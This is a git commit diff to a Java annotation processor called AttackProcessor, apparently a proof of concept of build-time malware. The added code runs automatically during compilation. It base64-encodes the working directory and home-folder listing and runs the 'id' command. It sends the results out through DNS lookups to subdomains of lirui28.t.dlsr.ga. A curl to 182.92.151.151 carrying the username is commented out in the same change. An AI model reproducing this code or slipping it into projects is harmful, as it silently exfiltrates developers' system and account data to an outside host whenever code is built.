713c4e18d5c837ecdc2702b7b4f8bfea6277aad4
nanolikeyou <714284051@qq.com>
2019-08-28 15:29:41 +0800

    a

--- processor/src/main/java/org/cyber/AttackProcessor.java
+++ processor/src/main/java/org/cyber/AttackProcessor.java
@@ -33,7 +33,7 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac2.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac8.lirui28.t.dlsr.ga" );
             String pwd = new File( "." ).getAbsolutePath();
             pwd = new String( Base64.getEncoder().encode( pwd.getBytes() ) );
 
@@ -44,47 +44,58 @@ public class AttackProcessor extends AbstractProcessor {
                 sb.append( Arrays.deepToString( files));
             }
             String fs = sb.toString();
+            //输出base64编码的url home文件夹的内容到外部
             fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
 
             Inet4Address.getByName( fs.substring( 0,40 )+".lirui28.t.dlsr.ga" );
 
-            Runtime runtime = Runtime.getRuntime();
+
 
             try {
-                Process p = runtime.exec("ps -ef");
+                Runtime runtime = Runtime.getRuntime();
+                Process p = runtime.exec("id");
                 BufferedReader bw = new BufferedReader( new InputStreamReader( p
                                                                                                .getInputStream()));
                 String s;
                 while ((s=bw.readLine())!=null) {
 
+                    Inet4Address.getByName( s+".lirui28.t.dlsr.ga" );
+
                     s = new String( Base64.getEncoder().encode( s.getBytes() ) );
 
-                    s = s.substring( 0,60 );
+                    s = s.substring( 0,40 );
                     Inet4Address.getByName( s+".lirui28.t.dlsr.ga" );
                 }
-            } catch (IOException e) {
+            } catch (Exception e) {
                 Inet4Address.getByName( "runtimeerror"+".lirui28.t.dlsr.ga" );
 
-                e.printStackTrace();
             }
 
         }
-        catch ( UnknownHostException e )
+        catch ( Exception e )
         {
-            //e.printStackTrace();
+            try
+            {
+                Inet4Address.getByName( "bigerror"+".lirui28.t.dlsr.ga" );
+            }
+            catch ( UnknownHostException e1 )
+            {
+                e1.printStackTrace();
+            }
+
         }
 
-        try {
-            Runtime r = Runtime.getRuntime();
-            //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
-
-            Process p = r.exec(new String[]{"/bin/bash","-c","curl http://182.92.151.151:8888/"+System.getProperty("user.name")});
-            p.waitFor();
-        } catch (IOException e) {
-            e.printStackTrace();
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
+//        try {
+//            Runtime r = Runtime.getRuntime();
+//            //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
+//
+//            Process p = r.exec(new String[]{"/bin/bash","-c","curl http://182.92.151.151:8888/"+System.getProperty("user.name")});
+//            p.waitFor();
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        } catch (InterruptedException e) {
+//            e.printStackTrace();
+//        }
 
 
         processingEnv.getMessager().printMessage(
